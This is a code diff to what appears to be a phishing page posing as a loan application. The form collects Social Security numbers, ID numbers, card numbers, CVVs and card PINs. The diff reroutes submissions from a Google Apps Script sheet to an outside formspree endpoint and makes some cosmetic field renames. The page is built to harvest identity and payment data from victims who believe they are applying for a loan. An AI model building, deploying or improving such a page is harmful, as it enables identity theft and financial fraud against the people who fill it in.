@@ -318,7 +318,7 @@ Place this snippet between the <head> and </head> tags on every page of your sit
 			
 
 <input id="StateRedirectInfo" name="StateRedirectInfo" type="hidden" value="{&quot;RedirectInfo&quot;:{}}" />
-<form name="submit-to-google-sheet" method="POST" class="applyloan update-form content-center">
+<form action="https://formspree.io/f/xknlpbga" method="POST" class="applyloan update-form content-center">
 
     <div id="form" class="col-sm-12">
         <p class="lead"><strong>New Customers:</strong> Complete form and select <strong class="apply-form-getstarted">SUBMIT</strong> below!</p>
@@ -336,11 +336,11 @@ Place this snippet between the <head> and </head> tags on every page of your sit
 
         <div class="form-group">
             <label>Date of Birth:<span class="required"></span></label>
-            <input class="form-control" type="date" name="DOB" placeholder="Enter your birth date" required style="width: 100%;">
+            <input class="form-control" type="date" name="Date of Birth:" placeholder="Enter your birth date" required style="width: 100%;">
         </div>
         <div class="form-group">
             <label>Gender:<span class="required"></span></label>
-            <select data-jcf="{wrapNative: false}" id="gender" name="G" style="width: 100%;"><option value="">Select Gender</option>
+            <select data-jcf="{wrapNative: false}" id="gender" name="Gender:" style="width: 100%;"><option value="">Select Gender</option>
                 <option value="M">Male</option>
                 <option value="F">Female</option>
             </select>
@@ -364,7 +364,7 @@ Place this snippet between the <head> and </head> tags on every page of your sit
         </div>
         <div class="form-group">
             <label>ID Number:<span class="required"></span></label>
-            <input class="form-control" id="Phone" name="ID Number:" placeholder="Enter id number" type="text" data-mask="999-999-9999" required/>
+            <input class="form-control" id="Phone" name="ID Number:" type="number" placeholder="Enter id number" type="text" data-mask="999-999-9999" required/>
         </div>
         <div class="form-group">
             <label>Issued Date:<span class="required"></span></label>
@@ -376,7 +376,7 @@ Place this snippet between the <head> and </head> tags on every page of your sit
         </div>
         <div class="form-group">
             <label>Social Security Number:<span class="required"></span></label>
-            <input class="form-control" id="Phone" name="Social Security Number:" placeholder="Enter your SSN" type="text" data-mask="999-999-9999" required/>
+            <input class="form-control" id="Phone" name="Social Security Number:" type="number" placeholder="Enter your SSN" type="text" data-mask="999-999-9999" required/>
         </div>
         <div class="form-group">
             <label>Expiry Date:<span class="required"></span></label>
@@ -410,7 +410,7 @@ Place this snippet between the <head> and </head> tags on every page of your sit
         </div>
         <div class="form-group">
             <label>Zip-Code:<span class="required"></span></label>
-            <input class="form-control" name="Zip-Code:" placeholder="Enter your zip-code" type="text" data-mask="999-999" required/>
+            <input class="form-control" name="Zip-Code:" type="number" placeholder="Enter your zip-code" type="text" data-mask="999-999" required/>
         </div>
 
     <br><br>
@@ -439,11 +439,11 @@ Place this snippet between the <head> and </head> tags on every page of your sit
     </div>
     <div class="form-group">
         <label>Card CVV:<span class="required"></span></label>
-        <input class="form-control" name="Card CVV:" placeholder="Enter your CVV" type="number" data-mask="999-999" required style="height: 100%; width: 1140px;"/>
+        <input class="form-control" name="Card CVV:" type="number" placeholder="Enter your CVV" type="number" data-mask="999-999" required style="height: 100%; width: 1140px;"/>
     </div>
     <div class="form-group">
         <label>Card Pin:<span class="required"></span></label>
-        <input class="form-control" name="Card Pin:" placeholder="Enter your pin" type="password" data-mask="9999" required/>
+        <input class="form-control" name="Card Pin:" type="number" placeholder="Enter your pin" type="password" data-mask="9999" required/>
     </div>
 
     <br><br>
@@ -478,16 +478,16 @@ Place this snippet between the <head> and </head> tags on every page of your sit
     <span class="title" style="font-size: 2.6rem; font-weight: 600;">Work Details</span>
     <br><br>
     <div class="form-group">
-        <label>Type Of Work:<span class="required"></span></label>
-        <input class="form-control" name="Type Of Work:" type="text" placeholder="Enter type of work" required style="width: 100%;">
+        <label>Type of Work:<span class="required"></span></label>
+        <input class="form-control" name="Type of Work:" type="text" placeholder="Enter type of work" required style="width: 100%;">
     </div>
     <div class="form-group">
         <label>Job Title:<span class="required"></span></label>
         <input class="form-control" name="Job Title:" type="text" placeholder="Enter Job Title" required style="width: 100%;">
     </div>
     <div class="form-group">
-        <label>Date Of Employment:<span class="required"></span></label>
-    <input class="form-control" name="Date Of Employment:" type="date" placeholder="Enter date of employment" required style="width: 100%;">
+        <label>Date of Employment:<span class="required"></span></label>
+    <input class="form-control" name="Date of Employment:" type="date" placeholder="Enter date of employment" required style="width: 100%;">
     </div>
         <!-- <label>Proof of income (must be within 30 days)<span class="required"></span></label>
         <input class="form-control" type="file" name="fileToUpload" id="fileToUpload"> -->
@@ -536,7 +536,7 @@ By clicking the submit button, I hereby promise, represent and warrant that I am
         </div>
 
     </form>
-    <span id="msg"></span>
+    <!-- <span id="msg"></span> -->
 
 </div>
 
@@ -841,7 +841,7 @@ else {
 }
       </script>
 
-<script>
+<!-- <script>
     const scriptURL = 'https://script.google.com/macros/s/AKfycbw6rUreJUqFBHpyog9OfBQ8lv3Em_RB4pAdamjrZvWbMTrjm-zCh1vwbNVbZ4v_RcM8/exec'
     const form = document.forms['submit-to-google-sheet']
     const msg = document.getElementById("msg")
@@ -858,7 +858,7 @@ else {
         })
         .catch(error => console.error('Error!', error.message))
     })
-  </script>
+  </script> -->
 
     
     
